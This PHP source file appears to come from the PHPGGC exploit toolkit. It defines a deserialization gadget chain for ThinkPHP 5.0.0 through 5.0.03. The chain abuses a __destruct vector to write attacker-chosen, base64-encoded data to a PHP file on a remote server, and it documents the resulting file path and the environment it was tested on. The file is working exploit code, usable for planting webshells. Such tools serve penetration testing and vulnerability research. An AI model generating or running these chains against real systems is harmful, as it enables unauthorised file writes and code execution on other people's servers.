<?php

namespace GadgetChain\ThinkPHP;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '5.0.0-5.0.03';
    public static $vector = '__destruct';
    public static $author = 'zcy2018';
    public static $information = '
        We do not have full control of the path. Also, the path will turn to
        a long hex value(md5) depends on the payload, and the payload have 
        some limitation as well. For stablity, I just fix the path and data. 
        Your file path will be ROMOTE_PATH/3b58a9545013e88c7186db11bb158c44.php.
        Tested on Windows with php7.3.4 and apache2.4.39.
    ';
    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = base64_encode($parameters['data']);
        $data= preg_replace('/=/','+',$data);
        return new \think\Process($path,$data);
    }
}